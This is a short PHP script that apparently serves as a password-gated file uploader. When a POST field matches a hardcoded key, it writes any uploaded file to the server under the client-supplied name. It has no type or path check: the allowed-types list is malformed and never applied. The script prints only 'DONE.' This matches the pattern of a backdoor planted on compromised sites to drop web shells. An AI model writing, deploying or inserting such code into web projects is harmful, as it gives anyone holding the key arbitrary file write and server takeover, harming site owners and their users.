
<?php 

	$XCODE 		= $_POST['XCODE'];           
	
	//////////////////////////////////////////////////////////////////////////////////////////
	
	if ( $XCODE == "X3464564245" )
	{
		$valid_types =  array("tmp,tmp2");
		$ext = substr($_FILES['file']['name'],  1 + strrpos($_FILES['file']['name'], ".")); 

		if ( is_uploaded_file($_FILES["file"]["tmp_name"]) )
		{			
			move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
		}
		else
		{
			echo "NOT UPLOADED<br><br>";
		}
	}

	//////////////////////////////////////////////////////////////////////////////////////////
	
	echo "DONE.";
?>